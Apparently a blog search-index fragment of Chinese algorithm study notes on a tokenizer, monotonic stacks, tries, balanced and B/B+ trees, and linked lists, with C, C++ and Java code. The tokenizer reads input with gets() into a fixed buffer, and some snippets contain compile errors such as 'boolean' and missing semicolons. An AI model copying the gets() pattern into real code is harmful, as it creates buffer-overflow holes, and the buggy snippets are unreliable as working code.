&#123;</span><br><span class="line">            token_val = token_val * <span class="number">10</span> + *src - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            src++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;token:%d(%c) token_val:%d\n&quot;</span>, token, token, token_val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">gets</span>(line)) &#123;</span><br><span class="line">        <span class="comment">// printf(&quot;%s&quot;, line);</span></span><br><span class="line">        src = line;</span><br><span class="line">        <span class="built_in">next</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">expr</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>单调栈</h1>
<blockquote>
<p>单调栈通过维持栈内值的单调递增（递减）性，在O(n)的时间内处理需要大小比较的问题。</p>
</blockquote>
<p><strong>及时移除无用数据，保证栈/队列的有序性</strong>。</p>
<h1>题目</h1>
<h4 id="2454-下一个更大元素-IV（单调栈）"><a href="https://leetcode.cn/problems/next-greater-element-iv/">2454. 下一个更大元素 IV</a>（单调栈）</h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">secondGreaterElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// using pii=pair&lt;int,int&gt;</span></span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(n,<span class="number">-1</span>)</span></span>;</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;,vector&lt;pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&gt;,greater&lt;&gt;&gt; pq;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="type">int</span> num=nums[i];</span><br><span class="line">            <span class="keyword">while</span>(!pq.<span class="built_in">empty</span>()&amp;&amp;pq.<span class="built_in">top</span>().first&lt;num)&#123;</span><br><span class="line">                <span class="keyword">auto</span> [_,t]=pq.<span class="built_in">top</span>();</span><br><span class="line">                pq.<span class="built_in">pop</span>();</span><br><span class="line">                ans[t]=num;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>()&amp;&amp;nums[stk.<span class="built_in">top</span>()]&lt;num)&#123;</span><br><span class="line">                pq.<span class="built_in">push</span>(&#123;nums[stk.<span class="built_in">top</span>()],stk.<span class="built_in">top</span>()&#125;);</span><br><span class="line">                stk.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            stk.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>树：字典树（前缀树、TrieTree）</title>
    <url>/2023/02/28/%E7%AE%97%E6%B3%95/%E6%A0%91%EF%BC%9A%E5%AD%97%E5%85%B8%E6%A0%91%EF%BC%88%E5%89%8D%E7%BC%80%E6%A0%91%E3%80%81TrieTree%EF%BC%89/</url>
    <content><![CDATA[<h1>1 字典树（前缀树、TrieTree）</h1>
<blockquote>
<p>字典树，又称单词查找树，Trie树(<mark>Retrieval Tree</mark>)，一种树形数据结构，用于高效的存储和检索字符串数据集中的键。</p>
<p>用于统计、排序和保存大量的字符串</p>
<p>优点：利用字符串的公共前缀来减少查询时间，最大限度地减少无谓的字符串比较</p>
<p>给定字符串集合构建一颗前缀树，判断前缀树中是否存在字符串或该字符串的前缀字典树用于判断字符串是否存在或者是否具有某种字符串前缀</p>
</blockquote>
<p><mark>结点表示从根结点到本结点的路径构成的字符串是否有效</mark></p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202410081556689.png" alt="202209202108218.png|500"></p>
<h2 id="1-1-数据结构">1.1 数据结构</h2>
<blockquote>
<p>字典树可以视为set，用于判断key是否存在；；但同时字典树也可以作为map，只需要再相应节点添加value值。</p>
</blockquote>
<p><a href="https://leetcode.cn/problems/sum-of-prefix-scores-of-strings/solution/by-lfool-w82u/">详解前缀树「TrieTree 汇总级别整理 🔥🔥🔥」 - 字符串的前缀分数和 - 力扣（LeetCode）</a></p>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>根据字符串集合构建前缀树</p>
</li>
<li class="lvl-2">
<p>目标字符串是否存在于前缀树中</p>
</li>
<li class="lvl-2">
<p>寻找目标字符串的前缀</p>
</li>
</ul>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//两种存储方式</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TrieNode</span>&#123;</span><br><span class="line">    TrieNode* son[<span class="number">26</span>]=&#123;&#125;;</span><br><span class="line">    boolean val; <span class="comment">//路径构成的字符串是否有效</span></span><br><span class="line">&#125;;</span><br><span class="line">TrieNode *root=<span class="keyword">new</span> TrieNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建前缀树</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(string word)</span></span>&#123;</span><br><span class="line">    TrieNode *cur=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">char</span> c: word)&#123;</span><br><span class="line">        <span class="type">int</span> id=c-<span class="string">&#x27;a&#x27;</span>;	<span class="comment">//当前字符应该存入哪一个孩子结点</span></span><br><span class="line">        <span class="keyword">if</span>(cur-&gt;son[id]==<span class="literal">nullptr</span>)</span><br><span class="line">            cur-&gt;son[id]=<span class="keyword">new</span> TrieNode;</span><br><span class="line">        cur=cur-&gt;son[id];</span><br><span class="line">    &#125;</span><br><span class="line">    cur-&gt;val=<span class="literal">true</span>;		<span class="comment">//表示当前字符串有效</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询给定的字符串在前缀树中是否存在</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">query</span><span class="params">(string word)</span></span>&#123;</span><br><span class="line">    TrieNode *cur=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">char</span> ch:word)&#123;</span><br><span class="line">        <span class="type">int</span> id=ch-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="comment">//字符串路径不存在</span></span><br><span class="line">        <span class="keyword">if</span>(cur-&gt;son[id]==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       	cur=cur-&gt;son[id];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//路径存在，路径终点处的结点是否有效</span></span><br><span class="line">    <span class="keyword">return</span> cur-&gt;val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//是否有word有前缀prefix</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">startsWith</span><span class="params">(string prefix)</span> </span>&#123;</span><br><span class="line">    TrieNode *cur=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">char</span> ch:prefix)&#123;</span><br><span class="line">        <span class="type">int</span> id=ch-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(cur-&gt;son[id]==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        cur=cur-&gt;son[id];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//查询完前缀</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//寻找单词的最短前缀</span></span><br><span class="line"><span class="function">string <span class="title">shortestPrefixOf</span><span class="params">(string word)</span></span>&#123;</span><br><span class="line">    TrieNode *cur=root;</span><br><span class="line">    string ret=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">char</span> ch: word)&#123;</span><br><span class="line">        <span class="type">int</span> id=ch-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(cur-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        <span class="keyword">if</span>(cur-&gt;son[id]==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        ret+=ch;</span><br><span class="line">        cur=cur-&gt;son[id];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//含有通配符的匹配</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">search</span><span class="params">(string word)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">query</span>(root,word,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">query</span><span class="params">(TrieNode *cur, string &amp;word,<span class="type">int</span> index)</span></span>&#123;</span><br><span class="line">    <span class="comment">//判断空节点要放在最前面，因为含有.时会遍历26个子节点</span></span><br><span class="line">    <span class="keyword">if</span>(cur==<span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(index==word.<span class="built_in">size</span>())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(word[index]==<span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">query</span>(cur-&gt;son[i],word,index<span class="number">+1</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> id=word[index]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">query</span>(cur-&gt;son[id],word,index<span class="number">+1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//哈希表存储</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TrieNode</span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="type">char</span>,TrieNode*&gt; son;</span><br><span class="line">    boolean val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox0"><label for="checkbox0"></label><a href="https://leetcode.cn/problems/implement-trie-prefix-tree/">208. 实现 Trie (前缀树)</a></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox1"><label for="checkbox1"></label><a href="https://leetcode.cn/problems/design-add-and-search-words-data-structure/">211. 添加与搜索单词 - 数据结构设计</a>(通配符匹配.)</p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox2"><label for="checkbox2"></label><a href="https://leetcode.cn/problems/implement-magic-dictionary/">676. 实现一个魔法字典</a>（修改一个字符的匹配，类似于存在一个.)</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>树：平衡搜索树</title>
    <url>/2024/03/06/%E7%AE%97%E6%B3%95/%E6%A0%91%EF%BC%9A%E5%B9%B3%E8%A1%A1%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    <content><![CDATA[<h1>1 二叉查找树</h1>
<ul class="lvl-0">
<li class="lvl-2">左子节点的值均小于根节点的值</li>
<li class="lvl-2">右子节点的值均大于根节点的值二叉查找树是一种基于比较的数据结构，它的每个节点都有一个键值，而且左子节点的键值小于父节点的键值，右子节点的键值大于父节点的键值。这样的结构可以方便地进行查找、插入和删除操作，因为只需要比较节点的键值就可以确定目标节点的位置。但是，二叉查找树有一个很大的问题，就是它的形状取决于节点插入的顺序。如果节点是按照升序或降序的方式插入的，那么二叉查找树就会退化成一个线性结构，也就是一个链表。这样的情况下，二叉查找树的性能就会大大降低，时间复杂度就会从 O(logn) 变为 O(n)。</li>
</ul>
<h1>2 平衡二叉树</h1>
<h2 id="2-1-AVL树">2.1 AVL树</h2>
<ul class="lvl-0">
<li class="lvl-2">空二叉树是AVL树</li>
<li class="lvl-2">左右子树的高度相差不超过1</li>
<li class="lvl-2">节点的平衡因子：节点的左子树高度减去右子树的高度</li>
</ul>
<h3 id="2-1-1-AVL平衡树的保持">2.1.1 AVL平衡树的保持</h3>
<blockquote>
<p>插入或者删除节点可能导致不平衡选择离插入(或删除)结点最近的不平衡结点(其平衡因子为±2)开始调整。</p>
</blockquote>
<p>LL型: 新结点插在A 的左子树的左子树中导致不平衡;<br>
RR型: 新结点插在A 的右子树的右子树中导致不平衡;<br>
LR型: 新结点插在A 的左子树的右子树中导致不平衡;<br>
RL型: 新结点插在A 的右子树的左子树中导致不平衡.</p>
<h4 id="LL型">LL型</h4>
<blockquote>
<p>将A的左子节点向上提<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403061658064.png" alt="image.png"></p>
</blockquote>
<h4 id="RR型">RR型</h4>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403061659163.png" alt="image.png"></p>
<h4 id="LR型">LR型</h4>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403061700794.png" alt="image.png"></p>
<h4 id="RL型">RL型</h4>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403061701893.png" alt="image.png"></p>
<h2 id="2-2-红黑树">2.2 红黑树</h2>
<blockquote>
<p>红黑树是一种自平衡的二叉查找树树中每个节点包含5个属性：color、key、left、right、p</p>
</blockquote>
<p>1.节点是红色或黑色。<br>
2.根节点是黑色。<br>
3.每个叶子节点都是黑色的空节点（NIL节点）。<br>
4 每个红色节点的两个子节点都是黑色。(从每个叶子到根的所有路径上不能有两个连续的红色节点)<br>
5.从任一节点到其每个叶子的所有路径都包含相同数目的黑色节点。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403062134140.png" alt="image.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403062146111.png" alt="image.png"></p>
<h2 id="2-3-AVL树和红黑树">2.3 AVL树和红黑树</h2>
<p>AVL树</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>严格的平衡二叉树，平衡条件（所有节点的左右子树高度差不超过1）。不满足条件，需要通过旋转来保持平衡。</p>
</li>
<li class="lvl-2">
<p>适用于插入和删除比较少，但查找比较多的情况红黑树</p>
</li>
<li class="lvl-2">
<p>是一种弱平衡二叉树</p>
</li>
<li class="lvl-2">
<p>适用于插入和删除比较多的情况</p>
</li>
<li class="lvl-2">
<p>TreeMap、TreeSet、HashMap使用红黑树实现</p>
</li>
<li class="lvl-2">
</li>
</ul>
<p><a href="https://zhuanlan.zhihu.com/p/65424847">AVL树 vs 红黑树 - 知乎 (zhihu.com)</a></p>
<h1>3 多路平衡搜索树</h1>
<h2 id="3-1-B-Trees">3.1 B-Trees</h2>
<blockquote>
<p>B-树,这里的 B 表示 balance( 平衡的意思),B-树是一种多路自平衡的搜索树（B树是<strong>一颗多路平衡查找树</strong>）<br>
它类似普通的平衡二叉树，不同的一点是B-树允许每个节点有更多的子节点。</p>
</blockquote>
<h3 id="3-1-1-2-3-Tree和2-3-4-Tree">3.1.1 2-3 Tree和2-3-4 Tree</h3>
<blockquote>
<p>L：每一个节点可以有的最多元素个数<br>
L=3的树称为2-3-4 tree或者2-4tree<br>
2-3-4指的是一个节点可能有2个孩子、3个孩子或者是4个孩子<br>
L=2的树称为2-3 tree</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403061559640.png" alt="image.png"><br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403061601349.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>所有叶子节点处于同一深度</p>
</li>
<li class="lvl-2">
<p>具有k个元素的非叶子节点有k+1个孩子</p>
</li>
</ul>
<h4 id="LLRB-Left-Leaning-Red-Black-Binary-Search-Tree">LLRB(Left-Leaning Red Black Binary Search Tree)</h4>
<p>2-3树和LLLRB树具有一一对应关系<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403062052009.png" alt="image.png"></p>
<h2 id="3-2-B-Trees">3.2 B+Trees</h2>
<p>B+树所有数据域存放在叶子节点</p>
<h2 id="3-3-B树和B-树区别">3.3 B树和B+树区别</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>在B+树中，叶结点包含信息，所有非叶结点仅起索引作用，非叶子结点中的每个索引项只是包含了对应子树最大关键字和指向该孩子树的指针，不含有该关键字对应记录的存储地址。</p>
</li>
<li class="lvl-2">
<p>在B+树中，终端结点包含全部关键字及相应记录的指针，即非终端结点出现过的关键字也会在这重复出现一次。而B树是不重复的。</p>
</li>
<li class="lvl-2">
<p>B 树的所有节点既存放键(key) 也存放数据(data)，而 B+树只有叶子节点存放 key 和 data，其他内节点只存放 key。</p>
</li>
<li class="lvl-2">
<p>B 树的叶子节点都是独立的;B+树的叶子节点有一条引用链指向与它相邻的叶子节点。</p>
</li>
<li class="lvl-2">
<p>B 树的检索的过程相当于对范围内的每个节点的关键字做二分查找，可能还没有到达叶子节点，检索就结束了。而 B+树的检索效率就很稳定了，任何查找都是从根节点到叶子节点的过程，叶子节点的顺序检索很明显。</p>
</li>
<li class="lvl-2">
<p>在 B 树中进行范围查询时，首先找到要查找的下限，然后对 B 树进行中序遍历，直到找到查找的上限；而 B+树的范围查询，只需要对链表进行遍历即可。</p>
</li>
</ul>
<p>综上，B+树与 B 树相比，具备更少的 IO 次数、更稳定的查询效率和更适于范围查询这些优势。</p>
<p><a href="https://blog.csdn.net/a519640026/article/details/106940115">一文彻底搞懂MySQL基础：B树和B+树的区别_mysql b树和b+树的区别-CSDN博客</a><br>
<a href="https://blog.csdn.net/weixin_43156699/article/details/117216784">B树和B+树详解-CSDN博客</a></p>
<p><a href="https://javaguide.cn/database/mysql/mysql-index.html#%E7%BA%A2%E9%BB%91%E6%A0%91">MySQL索引详解 | JavaGuide</a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
  </entry>
  <entry>
    <title>线性表</title>
    <url>/2023/02/28/%E7%AE%97%E6%B3%95/%E7%BA%BF%E6%80%A7%E8%A1%A8%EF%BC%9A%E6%95%B0%E7%BB%84%E3%80%81%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h1>1 线性表</h1>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403022059260.png" alt="image.png"></p>
<h1>2 线性链表</h1>
<blockquote>
<p>带表头结点</p>
<ul class="lvl-1">
<li class="lvl-2">从表尾到表头逆向建立单链表</li>
<li class="lvl-2">插入结点</li>
<li class="lvl-2">删除结点</li>
</ul>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403022103444.png" alt="线性表.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    线性链表的实现</span></span><br><span class="line"><span class="comment">    单链表：只有一个指向后继的指针</span></span><br><span class="line"><span class="comment">    单向循环链表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Link_list</span> &#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    Link_list *next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Link_list *<span class="title">Get_node</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Link_list *p = (Link_list *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Link_list));</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    创建一个含有n个结点的链表（不包括头结点）</span></span><br><span class="line"><span class="comment">    先插入的结点离头结点更远</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Create_List</span><span class="params">(Link_list *&amp;L, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    L = (Link_list *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Link_list));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        Link_list *p = <span class="built_in">Get_node</span>();</span><br><span class="line">        <span class="keyword">if</span> (!p)</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;分配结点失败&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="type">int</span> t;</span><br><span class="line">        cin &gt;&gt; t;</span><br><span class="line">        p-&gt;data = t;</span><br><span class="line"></span><br><span class="line">        p-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Show_List</span><span class="params">(Link_list *&amp;L)</span> </span>&#123;</span><br><span class="line">    Link_list *p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p) &#123;</span><br><span class="line">        cout &lt;&lt; p-&gt;data &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    带表头结点L</span></span><br><span class="line"><span class="comment">    当第i个元素存在时，用value返回其值</span></span><br><span class="line"><span class="comment">    元素位序从1开始</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Get_node</span><span class="params">(Link_list *&amp;L, <span class="type">int</span> i, <span class="type">int</span> &amp;value)</span> </span>&#123;</span><br><span class="line">    Link_list *p = L;</span><br><span class="line">    <span class="keyword">while</span> (i &gt; <span class="number">0</span> &amp;&amp; p) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        --i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!p || i &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    value = p-&gt;data;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    在第i个位置插入元素额，第i个位置元素后移</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Insert_node</span><span class="params">(Link_list *&amp;L, <span class="type">int</span> i, <span class="type">int</span> e)</span> </span>&#123;</span><br><span class="line">    Link_list *p = L, *t;</span><br><span class="line">    <span class="comment">//寻找第i-1个结点</span></span><br><span class="line">    <span class="keyword">while</span> (p &amp;&amp; i &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        --i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!p || i &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;i不正确&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    t = <span class="built_in">Get_node</span>();</span><br><span class="line">    t-&gt;data = e;</span><br><span class="line"></span><br><span class="line">    t-&gt;next = p-&gt;next;</span><br><span class="line">    p-&gt;next = t;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    删除第i个位置的元素，并由e返回其值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Delete_node</span><span class="params">(Link_list *&amp;L, <span class="type">int</span> i, <span class="type">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Delete:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    Link_list *p = L;</span><br><span class="line">    <span class="comment">//寻找第i-1个元素</span></span><br><span class="line">    <span class="keyword">while</span> (p &amp;&amp; i &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        --i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!p || i &gt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    e = p-&gt;next-&gt;data;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;P-&gt;data:&quot;</span> &lt;&lt; p-&gt;data &lt;&lt; <span class="string">&quot; e:&quot;</span> &lt;&lt; e &lt;&lt; endl;</span><br><span class="line">    Link_list *t = p-&gt;next;</span><br><span class="line">    p-&gt;next = t-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(t);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Link_list *L;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;要创建的结点数：&quot;</span>;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="built_in">Create_List</span>(L, n);</span><br><span class="line">    <span class="built_in">Show_List</span>(L);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Insert_node</span>(L, <span class="number">3</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="built_in">Show_List</span>(L);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="built_in">Delete_node</span>(L, <span class="number">2</span>, value);</span><br><span class="line">    <span class="built_in">Show_List</span>(L);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;value: &quot;</span> &lt;&lt; value &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>3 双向链表</h1>
<h1>4 比较</h1>
<table>
<thead>
<tr>
<th>数据结构</th>
<th>插入</th>
<th>删除</th>
<th>比较</th>
</tr>
</thead>
<tbody>
<tr>
<td>线性表</td>
<td>O(n)</td>
<td>O(n)</td>
<td>移动元素</td>
</tr>
<tr>
<td>链表</td>
<td>O(n)</td>
<td>O(n)</td>
<td>寻找位置</td>
</tr>
<tr>
<td>双向链表</td>
<td>O(n)</td>
<td>O(n)</td>
<td></td>
</tr>
</tbody>
</table>
<h1>5 定义</h1>
<blockquote>
<p>链表有节点域和指针域两部分组成</p>
<ul class="lvl-1">
<li class="lvl-2">precursor(pre，前驱)</li>
<li class="lvl-2">successor(succ，后继)</li>
<li class="lvl-2">dummy node(虚拟节点)</li>
</ul>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	ListNode *next;</span><br><span class="line">	<span class="built_in">ListNode</span>(<span class="type">int</span> x): <span class="built_in">val</span>(x),<span class="built_in">next</span>(<span class="literal">nullptr</span>)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	ListNode next;</span><br><span class="line">	ListNode(<span class="type">int</span> x)&#123;</span><br><span class="line">		val=x;</span><br><span class="line">		next=<span class="literal">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>6 题单</h1>
<h2 id="6-1-翻转链表">6.1 翻转链表</h2>
